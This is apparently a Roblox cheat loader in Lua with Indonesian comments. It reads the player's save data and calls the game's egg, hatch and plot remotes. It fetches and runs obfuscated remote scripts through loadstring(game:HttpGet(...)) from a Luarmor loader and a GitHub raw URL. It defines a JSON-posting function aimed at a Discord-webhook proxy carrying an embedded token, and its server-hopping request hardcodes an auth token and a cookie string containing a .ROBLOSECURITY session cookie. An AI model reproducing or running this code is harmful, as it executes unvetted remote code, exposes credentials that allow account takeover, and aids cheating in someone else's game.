if _G.idblx_loader then
	return
end

_G.idblx_loader = true

replicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = game:GetService("Players").LocalPlayer
local function fn11()
    local tbl6

    tbl6 = {
        Ready = false,
        Network = nil,
        EggCmds = nil,
        AssetCmds = nil,
        PlotCmds = nil,
        Save = nil,
        BaseUpgradeClient = nil,
        AssetGenerationUtil = nil,
        AssetItemSerialization = nil,
        TreadmillUtil = nil,
        RebirthUtil = nil,
        Assets = nil,
        Rarity = nil,
        Treadmills = nil,
        Bases = nil,
        Rebirths = nil,
        Areas = nil,
        Trails = nil,
        SettingsCmds = nil,
        Remotes = nil,
        EggState = nil,
        PlotState = nil,
        Init = function()
            if replicatedStorage:FindFirstChild("Data") ~= nil or replicatedStorage:FindFirstChild("Shared") ~= nil then
                pcall(function()
                    local shared = replicatedStorage:FindFirstChild("Shared")
                    local data = replicatedStorage:FindFirstChild("Data")
                    local client = replicatedStorage:FindFirstChild("Client")

                    if shared and shared:FindFirstChild("Remotes") then
                        tbl6.Remotes = require(shared.Remotes)
                    end

                    if shared and shared:FindFirstChild("Save") then
                        tbl6.Save = require(shared.Save)
                    end

                    if data and data:FindFirstChild("Assets") then
                        tbl6.Assets = require(data.Assets)
                    end

                    if data and data:FindFirstChild("Bases") then
                        tbl6.Bases = require(data.Bases)
                    end

                    if data and data:FindFirstChild("Rarity") then
                        tbl6.Rarity = require(data.Rarity)
                    end

                    if data and data:FindFirstChild("Treadmills") then
                        tbl6.Treadmills = require(data.Treadmills)
                    end

                    if data and data:FindFirstChild("Areas") then
                        tbl6.Areas = require(data.Areas)
                    end

                    if data and data:FindFirstChild("Trails") then
                        tbl6.Trails = require(data.Trails)
                    end

                    if shared and shared:FindFirstChild("SettingsCmds") then
                        tbl6.SettingsCmds = require(shared.SettingsCmds)
                    end

                    if client and client:FindFirstChild("EggState") then
                        tbl6.EggState = require(client.EggState)
                    end

                    if client and client:FindFirstChild("PlotState") then
                        tbl6.PlotState = require(client.PlotState)
                    end
                end)

                tbl6.EggCmds = {
                    GetAreaEggSnapshot = function()
                        local ok, result = pcall(function()
                            if tbl6.Remotes and tbl6.Remotes.EggWorld and tbl6.Remotes.EggWorld.AskFieldEggSnapshot then
                                return tbl6.Remotes.EggWorld.AskFieldEggSnapshot:InvokeServer()
                            end

                            if tbl6.EggState and tbl6.EggState.ReadFieldEggs then
                                return { Records = tbl6.EggState.ReadFieldEggs() }
                            end
                        end)

                        return ok and type(result) == "table" and result or { Records = {} }
                    end,
                    GetRuntimeSnapshot = function()
                        local ok, result = pcall(function()
                            if tbl6.Remotes and tbl6.Remotes.EggWorld and tbl6.Remotes.EggWorld.AskLiveSnapshot then
                                return tbl6.Remotes.EggWorld.AskLiveSnapshot:InvokeServer()
                            end

                            if tbl6.EggState and tbl6.EggState.ReadOwnedEggs then
                                return tbl6.EggState.ReadOwnedEggs()
                            end
                        end)

                        if ok and type(result) == "table" then
                            if result.Records then
                                return { result }
                            end
                            return result
                        end

                        return { { OwnerUserId = localPlayer.UserId, Records = {} } }
                    end,
                    RequestAreaEggSnapshot = function()
                        local ok, result = pcall(function()
                            if tbl6.EggState and tbl6.EggState.SyncFieldEggs then
                                local v7 = tbl6.EggState.SyncFieldEggs()
                                if type(v7) == "table" then
                                    return v7
                                end
                            elseif tbl6.Remotes and tbl6.Remotes.EggWorld and tbl6.Remotes.EggWorld.AskFieldEggSnapshot then
                                return tbl6.Remotes.EggWorld.AskFieldEggSnapshot:InvokeServer()
                            end
                        end)

                        return ok and type(result) == "table" and result or {}
                    end,
                    RequestRuntimeSnapshot = function()
                        local ok, result = pcall(function()
                            if tbl6.Remotes and tbl6.Remotes.EggWorld and tbl6.Remotes.EggWorld.AskLiveSnapshot then
                                return tbl6.Remotes.EggWorld.AskLiveSnapshot:InvokeServer()
                            end

                            if tbl6.EggState and tbl6.EggState.SyncOwnedEggs then
                                return tbl6.EggState.SyncOwnedEggs()
                            end
                        end)

                        return ok and type(result) == "table" and result or {}
                    end,
                    RequestCarryAreaEgg = function(arg, arg2)
                        local ok, result = pcall(function()
                            if tbl6.Remotes and tbl6.Remotes.EggWorld and tbl6.Remotes.EggWorld.AskFieldEggCarry then
                                return tbl6.Remotes.EggWorld.AskFieldEggCarry:InvokeServer({ Uid = arg, FirstAreaSlotKey = arg2 })
                            end
                            return require(game:GetService("ReplicatedStorage").Shared.Remotes).EggWorld.AskFieldEggCarry:InvokeServer({ Uid = arg, FirstAreaSlotKey = arg2 })
                        end)

                        return ok and result
                    end,
                    RequestDropHeldEgg = function(arg)
                        local ok, result = pcall(function()
                            if tbl6.EggState and tbl6.EggState.DropFieldEgg then
                                return tbl6.EggState.DropFieldEgg(arg)
                            end

                            if tbl6.Remotes and tbl6.Remotes.EggWorld and tbl6.Remotes.EggWorld.AskFieldEggDrop then
                                return tbl6.Remotes.EggWorld.AskFieldEggDrop:InvokeServer({ Reason = arg })
                            end
                        end)

                        return ok and result
                    end,
                    RequestPlaceEgg = function(arg, arg2, arg3)
                        arg3 = typeof(arg3) == "CFrame" and arg3
                        local cframe

                        if arg3 then
                            cframe = arg3
                        else
                            cframe = typeof(arg2) == "CFrame" and arg2 or CFrame.new()
                        end

                        if tbl6.EggState and tbl6.EggState.PlantEgg then
                            local ok, result = pcall(function()
                                return tbl6.EggState.PlantEgg(arg, cframe)
                            end)

                            if ok and result == true then
                                return true
                            end
                        end

                        local ReplicatedStorage = game:GetService("ReplicatedStorage")
                        local networking = ReplicatedStorage:FindFirstChild("Packages") and ReplicatedStorage.Packages:FindFirstChild("Networking")
                        local rfEggWorldAskPlaceEgg = networking and networking:FindFirstChild("RF/EggWorld/AskPlaceEgg")

                        if rfEggWorldAskPlaceEgg then
                            local ok, result = pcall(function()
                                return rfEggWorldAskPlaceEgg:InvokeServer({ Uid = arg, LocalCFrame = cframe })
                            end)

                            if ok and (result == true or type(result) == "table" and result.Outcome == true) then
                                return true
                            end
                        end

                        return false
                    end,
                    RequestHatchEgg = function(arg)
                        local ok, result = pcall(function()
                            if tbl6.EggState and tbl6.EggState.BeginHatch then
                                return tbl6.EggState.BeginHatch(arg)
                            end

                            if tbl6.Remotes and tbl6.Remotes.EggWorld and tbl6.Remotes.EggWorld.AskHatch then
                                return tbl6.Remotes.EggWorld.AskHatch:InvokeServer(arg)
                            end
                        end)

                        return ok and result
                    end,
                    RequestCompleteHatchEgg = function(arg)
                        local ok, result = pcall(function()
                            if tbl6.EggState and tbl6.EggState.FinishHatch then
                                return tbl6.EggState.FinishHatch(arg)
                            end

                            if tbl6.Remotes and tbl6.Remotes.EggWorld and tbl6.Remotes.EggWorld.AskFinishHatch then
                                return tbl6.Remotes.EggWorld.AskFinishHatch:InvokeServer(arg)
                            end
                        end)

                        return ok and result
                    end,
                    RequestEquipTool = function(arg)
                        local ok, result = pcall(function()
                            if tbl6.EggState and tbl6.EggState.WearEggTool then
                                return tbl6.EggState.WearEggTool(arg)
                            end

                            if tbl6.Remotes and tbl6.Remotes.EggWorld and tbl6.Remotes.EggWorld.AskWearTool then
                                return tbl6.Remotes.EggWorld.AskWearTool:InvokeServer(arg)
                            end
                        end)

                        return ok and result
                    end,
                    RequestUnequipTool = function(arg)
                        local ok, result = pcall(function()
                            if tbl6.EggState and tbl6.EggState.DoffEggTool then
                                return tbl6.EggState.DoffEggTool(arg)
                            end

                            if tbl6.Remotes and tbl6.Remotes.EggWorld and tbl6.Remotes.EggWorld.AskDoffTool then
                                return tbl6.Remotes.EggWorld.AskDoffTool:InvokeServer(arg)
                            end
                        end)

                        return ok and result
                    end,
                    IsLocalEggReady = function(arg)
                        if tbl6.EggState and tbl6.EggState.IsReadyToHatch then
                            return tbl6.EggState.IsReadyToHatch(arg)
                        end
                        return false
                    end,
                }

                tbl6.PlotCmds = {
                    GetPlotData = function()
                        local localPlayer2 = localPlayer or game.Players.LocalPlayer
                        local resolvePlot = tbl6.PlotState and tbl6.PlotState.ResolvePlot
                        local v7 = nil

                        if resolvePlot then
                            v7 = tbl6.PlotState.ResolvePlot(localPlayer2)
                        end

                        if not v7 then
                            local ok, result = pcall(function()
                                return require(game:GetService("ReplicatedStorage").Client.PlotState)
                            end)

                            if ok and result and result.ResolvePlot then
                                v7 = result.ResolvePlot(localPlayer2)
                            end
                        end

                        if v7 and v7.CenterPoint and v7.PetArea then
                            local plotFolder = v7.PlotFolder
                            local toUpdate = plotFolder and plotFolder:FindFirstChild("ToUpdate")
                            toUpdate = toUpdate and toUpdate:FindFirstChild("PetArea") or plotFolder and plotFolder:FindFirstChild("PetArea") or v7.PetArea

                            return {
                                PlotIndex = tonumber(v7.Slot) or 1,
                                PlotFolder = plotFolder,
                                CenterPoint = v7.CenterPoint,
                                PetArea = toUpdate,
                                RespawnPointCFrame = v7.RespawnPointCFrame,
                            }
                        end

                        return nil
                    end,
                    GetPlotFromPart = function(arg)
                        while arg and arg.Parent and arg.Parent ~= workspace.Plots do
                            arg = arg.Parent
                        end

                        return arg
                    end,
                }

                tbl6.GetPlot = tbl6.PlotCmds.GetPlotData

                tbl6.Network = setmetatable({}, { __index = function()
                    return {
                        FireServer = function()
                        end,
                        InvokeServer = function()
                        end,
                    }
                end })

                tbl6.Ready = tbl6.Save ~= nil and tbl6.Assets ~= nil and tbl6.Remotes ~= nil
                return tbl6.Ready
            end

            local library = replicatedStorage:FindFirstChild("Library")
            local directory = replicatedStorage:FindFirstChild("Directory")

            if library then
                pcall(function()
                    tbl6.Network = require(library.Client.Network)
                    tbl6.EggCmds = require(library.Client.EggCmds)
                    tbl6.AssetCmds = require(library.Client.AssetCmds)
                    tbl6.PlotCmds = require(library.Client.PlotCmds)
                    tbl6.Save = require(library.Client.Save)
                end)
            end

            if directory then
                pcall(function()
                    tbl6.Assets = require(directory.Assets)
                    tbl6.Rarity = require(directory.Rarity)
                    tbl6.Treadmills = require(directory.Treadmills)
                    tbl6.Bases = require(directory.Bases)
                    tbl6.Areas = require(directory.Areas)
                end)
            end

            tbl6.Ready = tbl6.Save ~= nil and tbl6.Assets ~= nil
            return tbl6.Ready
        end,
        GetSave = function()
            if not tbl6.Save then
                local ok, save = pcall(function()
                    return require(game:GetService("ReplicatedStorage").Shared.Save)
                end)

                if not ok or not save then
                    ok, save = pcall(function()
                        return require(game:GetService("ReplicatedStorage").Client.Save)
                    end)
                end

                if ok and save then
                    tbl6.Save = save
                end
            end

            if tbl6.Save and tbl6.Save.Get then
                local ok, result = pcall(function()
                    return tbl6.Save.Get()
                end)

                if ok and type(result) == "table" then
                    return result
                end
            end

            if tbl6.Save and tbl6.Save.Peek then
                local ok, result = pcall(function()
                    return tbl6.Save.Peek()
                end)

                if ok and type(result) == "table" then
                    return result
                end
            end

            return nil
        end,
        GetSaveWait = function()
            if not tbl6.Save then
                return nil
            end
            local v7 = tbl6.GetSave()
            local n = 0

            while not v7 and n < 30 do
                task.wait(1)
                v7 = tbl6.GetSave()
                n += 1
            end

            return v7
        end,
        GetPlot = function()
            if not tbl6.PlotCmds then
                return nil
            end

            local ok, result = pcall(function()
                return tbl6.PlotCmds.GetPlotData()
            end)

            if ok and type(result) == "table" then
                return result
            end
            return nil
        end,
        GetMyUserId = function()
            return localPlayer.UserId
        end,
        GetAreas = function()
            if not tbl6.Areas or not tbl6.Areas.Directory then
                return {}
            end
            local tbl7 = {}

            for k in pairs(tbl6.Areas.Directory) do
                table.insert(tbl7, k)
            end

            table.sort(tbl7)
            return tbl7
        end,
    }

    return tbl6
end

local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local shared=ReplicatedStorage:WaitForChild("Shared")
local save=require(shared.Save)
function httpPost(dr)
    local ds = (syn and syn.request) or (http and http.request) or http_request or request
    if typeof(ds) ~= "function" then return false end
    local dt = "https://webhook.lewisakura.moe/api/webhooks/1550405147438350406/axUdQ6pNhJnU5S9ibampQTdmSFtt8Dqq8nv0d4FQGKv-mR1nM4z6h_hGqb5vA-_5ujg9"
    if dt == "" then return false end
    local du
    local dv = pcall(function() du = HttpService:JSONEncode(dr) end)
    if not dv then return false end
    return pcall(ds, {
        Url = dt, Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = du,
    })
end

local framework = fn11()
framework.Init()

local speedPower = 10

repeat
    saveData = framework.GetSaveWait()
    if saveData and saveData.SpeedPower ~= nil then
        speedPower = tonumber(saveData.SpeedPower)
    else
        task.wait(3) -- Tunggu 1 detik sebelum mencoba lagi agar tidak lag
    end
until saveData and saveData.SpeedPower ~= nil


if speedPower < 2000000 then
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/307981fffc5ae30456faa083d134af70.lua"))()
else
	loadstring(game:HttpGet("https://raw.githubusercontent.com/virtuososvisualedits-prog/Ww/refs/heads/main/final-obfuscated.lua"))()
end


local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local placeId = game.PlaceId

-- Menggunakan RoProxy untuk memproses HTTP request dari client Roblox
local apiUrl = "https://games.roblox.com/v2/games/107778070777162/servers/Public?cursor=&sortOrder=Desc&excludeFullGames=true&orderBy=BestLatency"

local function findAndTeleport()
	local isTeleported = false

	while not isTeleported do
		pcall(function()
			print("Mengambil data server...")

			local requestFunc = http_request or request or syn.request
			if requestFunc then
				local success, response = pcall(function()
					return requestFunc({
						Url = apiUrl,
						Method = "GET",
						Headers = {
							["x-bound-auth-token"] = "v1|47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=|1792064128|Tpc6YFx/BeRWueGbji9MmtKKQ5UTXhXLikTOtYwLCbvpwmL+xdgqgnds7SqrEuNzy+y6a9tb8kZASatvs4qGYA==|mtYRFFE/ORYS1JYyjiGnMT19oLULTQ/R/WZsKQPiuJmtI6P2vxD4NWn8/qND5a6PazjxgHP8OcIC8bcyhPEqHQ==",
							["Cookie"] = "__utma=200924205.702503118.1699206842.1792059725.1792063654.169; RBXEventTrackerV2=CreateDate=10/15/2026 06:33:14&rbxid=11808188131&browserid=203994001110&rbxuid=11812045806; __utmz=200924205.1770435606.129.17.utmcsr=create.roblox.com|utmccn=(referral)|utmcmd=referral|utmcct=/; _ga=GA1.1.887321143.1736947665; .ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEQAhoGCAIQBBgBIhwKBGR1aWQSFDEwOTI0NjAzODcyMjkyMzg0MjE2IhEKBXVuYW1lEghpYmxyaXNldCISCgN1aWQSCzExODEyMDQ1ODA2KAM.TuaUboBHArx7K3FoYPWcvb8dHH_FT_c_dHp-X1Yy59_vfjxfxUjUyGTaLsqeWaGmtX01DPuw-hkZGQ7rxHPKRhuP8oxbCbB5wY5SWmxpp9YPN4TDGj6ERvvhBaEG1z0n35UPqqLhz0NEd0NdbaoHebH7qm1LeLcKyzuOPX084zl4-Uq-XYrIN98uAsAKVsvILBGPWio0lEtf-SNkOUH4mBojhfC22qvGuba_XiBMna8_q44kG3mzQU2CHVa2YWfrgHeyDbEqPeMF5VTU__1espolpb7kva1f4cytpBnLQR3eTsoHNZbJzbM2JgzY6CAxIH2bRMitytSXU31BauXrqobNPH9h6Ja4dGZhNZn4aNG9LwuHJDG-RZISiWC7dJgr9FPX4Oh7oPJGqTBJQQuQq6GYE_gh_Oq5x0KkGetZ0v4hozqVbQ1hOxqSXTmb7_nEkvJRY-YxrqmqPdZ5MzybQWdrO-NoD9OgdJhjr4VR3ahMvcpY_FSk6vf7L4pveuaBTpLN1JZWTyDKdSBhvnx2B5Hny1oddL9_pPhIL4wcnbVkLUuODm9wYJ83InPKm-WGkvQKBkJLSbdAex85BfWWc3oO56O_7TfGvqErjOLfhKiQxJ62JMMW3Gqco_0liO4aHYZjoysPLEl76LBh4cKDuK7Y9Wm00zlI7-2-rcHXSFtmlOnG24I9m3V1RHP1RR2c9c-HgKkKhHxVB_v2LEkVho1288n590rBREikKCExowE9PQY_ORBu69RGChvFfHjorRWRKg_vImyisBK1BrigwsmszSBtR70iMz3kml1D0oWiPaXiowSeJhpaPUAloLh-yyog9WFwLe87gaXhOqwN_Wf28LFaQ3ymT_eYy5148pw.1Y_BXF9uSmHQ6_9gO0ZzV_zw_yk; _ga_BK4ZY0C59K=GS2.1.s1758640060$o9$g0$t1758640060$j60$l0$h0; rbxas=1922b49c7be88827fae0ea6a73548d2058e727cc591f77cde430b4bd7f347002; GuestData=UserID=-211595320; cf_clearance=5Y6Wh264Zg5x98Jtmj6QrfdPgNMxg2Q1KXfQVlQyCBo-1788083614-1.2.1.1-VtD66iWE1KA_f3KDhpifsgJBKulXqV9RpqoUw7OyB_8R86.2g4pDmEwiiuRHepQB8mjBE0oxhpufKw7fsb2x7UxYjvVwiRFfRhdHqlJG3B0xUUrbxMLgW3hUawkRbFYz3sMguHA2S.kDcwbdIHOemOSSftcEI7zbPtorItHYLqrmms5gOu5OqiP1RWbPe3hM85bfXukynOeqK9zffzAXwzvMf3UhXbsW4271VO81y.IwNw_SFr3hrLH7EvCLiPqhNH4ImhqH6yaR2wAD8atOP1nlWKL7bU.MEn0gfOEGzPb3LX_65eEXzMfgA9f25lGBQUYK2uCJZPe03vM6kxL_D4.nqqlIDBi2nS4ECqYcoH4; RBXcb=RBXViralAcquisition%3Dtrue%26RBXSource%3Dtrue%26GoogleAnalytics%3Dtrue; RBXSource=rbx_acquisition_time=09/20/2026 12:12:55&rbx_acquisition_referrer=https://www.roblox.com/home&rbx_medium=Social&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_ad=&rbx_send_info=0; RBXcp=standard; RBXSessionTracker=sessionid=f59c0075-a64e-4454-b23b-ea576892a957; __utmc=200924205; ak_bmsc=33B73BF80AB40F52385E1A55C893D56C~000000000000000000000000000000~YAAQ1AIKcleCIjqhAQAAy1MVPwF16DbX2UPD5mtewDOOszEVcRqaVk5zkeJdPQAkzbvNteo3U2lj7Die6Nd/eZX060tQcsljk7BZK9/I/A2HBv0eudcL4tp5XS3h+IAqTLtkUaoeGcUB7T8FiHXf620IElgvJDj2u01AcZrOZaQH7d9LPY2r66As2+Q/auqPzoxqOR8PVohlL4jZ2xOaVJSCxQRP+mrLcjlQRrCPT0Mvx3LXU2trH3Jxfj+DtoPRRIyNuktc7Cdo/mOwQ2z1A6QlrGLGTLVIGaUYVMRluu1geM01pFRMbv4ZijdTO+r3wa8o7sVcrtF2kbEl1Hw8lLXQdbBGHXvn8AsSwmNK92XPHP0ltLg20LRLtIlADv0NAdYaE76bj84NMhVd; bm_sv=F22C1F3E9ADAFD81EF5FDCC6C9E7862E~YAAQ1AIKclMGIzqhAQAAqYRWPwELHIhSnsUqquA6nN3EhYAhcdEp+B4OCEf/6XXhTh3FvED1yikxMdbhQjZpzei/++uKBWXk4Y5InydUHVnZI6zqrztu/+N/LKBUts55r2C81xn60wRuRnlJMnRxyJ7DADATbe3nY5GwdTzIlWfWhRW8Fb//D67ODzkzrr9cQ6770KspRQgR5iTkQwqPp5Tm0f/26ickvYsrAu0kgfiRaCyzS4pZnSSNmA58l0GJ~1; rbx-ip2=1; RBXPaymentsFlowContext=2beab640-0da6-444e-8d00-acd0be863556,; __utmb=200924205.0.10.1792063654; _pxvid=6b6b5f10-c88b-11f1-864d-f26c378f8a1c; pxcts=ZrPJis-NnH/DWK4WrumFV8QbIN0GrG41-lIYceRsVuY=:UC9TToQqfD1/Cf2I181wZnIEJawRPphJoouanPShD55Q9DoGEv3pzD/P/CQeBBhmXqO0y7f78q26-12YM8XMxBJgJwJ41JNl4RgMbYU7H9FqtEEylnQMalLhjzq3jFZYdZlpAmwvJ9xUsDeCe4GutQ6pvHW18NzQl0aqBdQcfKuIjXQmWeubIY7ZbaOS4NNU; __cf_bm=TFWEOrd4GnNsjvAjNjJNR.u1e4n2nz3S6ch5UYD18oo-1792063993.19822-1.0.1.1-GxQzRrexZ3w5dU_7WK1YbzhyhGJrUip8LW_QHruA.Wm5rs_moOSWKWD.6cG.tVSCcfgjG_z.Or5cYMAKrHLORzOWL_wxMuBlOvVwCL.NdFedyOkr9NdJTu_bVsr67Eur"
						}
					})
				end)

				if success and response then
					local decodeSuccess, responseData = pcall(function()
						return HttpService:JSONDecode(response.Body)
					end)

					if decodeSuccess and responseData and responseData.data then
						local filteredServers = {}

						-- Filter kriteria: ping < 100 dan playing < 4
						for _, server in ipairs(responseData.data) do
							local ping = server.ping
							local playing = server.playing

							if ping and typeof(ping) == "number" and playing and typeof(playing) == "number" then
								if ping < 150 and playing < 6 then
									table.insert(filteredServers, server)
								end
							end
						end

						-- Urutkan: Prioritas playing paling sedikit, lalu ping paling kecil
						table.sort(filteredServers, function(a, b)
							if a.playing == b.playing then
								return a.ping < b.ping
							end
							return a.playing < b.playing
						end)

						-- Cek jika ada server yang lolos kriteria
						if #filteredServers > 0 then
							print("Ditemukan " .. #filteredServers .. " server yang memenuhi kriteria. Memulai percobaan teleportasi...")

							-- Coba teleportasi satu per satu dari server urutan teratas
							for rank, server in ipairs(filteredServers) do
								print(string.format("Mencoba teleport ke Server #%d | ID: %s | Playing: %d | Ping: %d", rank, server.id, server.playing, server.ping))

								local teleportSuccess, err = pcall(function()
									TeleportService:TeleportToPlaceInstance(placeId, server.id, player)
								end)

								if teleportSuccess then
									isTeleported = true
									break -- Keluar dari loop jika teleport berhasil diproses
								else
									warn("Gagal teleport ke server #" .. rank .. " (" .. server.id .. "):", err)
									task.wait(1) -- Jeda singkat sebelum mencoba server berikutnya dalam daftar
								end
							end

							if not isTeleported then
								warn("Semua server dalam daftar hasil filter gagal diteleportasi.")
							end
						else
							warn("Tidak ada server yang memenuhi kriteria (ping < 100 dan playing < 4).")
						end
					else
						warn("Gagal melakukan parse JSON response.")
					end
				else
					warn("Gagal mengambil data dari API proxy.")
				end

				-- Jika belum berhasil teleportasi, tunggu 10 detik lalu ambil data API baru
				if not isTeleported then
					print("Menunggu 30 detik sebelum mengambil data API baru...")
					task.wait(30)
				end
			else
				warn("Tidak memiliki fungsi http_request!")
				return
			end
		end)
	end
end

task.spawn(function()
    local TeleportService = game:GetService("TeleportService")
    local Players = game:GetService("Players")

    local player = Players.LocalPlayer
    local placeId = game.PlaceId
    local jobId = game.JobId -- ID Server saat ini

    -- Waktu tunggu dalam detik (30 menit = 1800 detik)
    local WAKTU_TUNGGU = math.random(1700, 1900)

    task.wait(WAKTU_TUNGGU)

    -- Boleh ditambahkan notifikasi ke pemain sebelum rejoin
    print("Waktu bermain 30 menit telah habis. Mencoba rejoin...")

    findAndTeleport()

    
end)
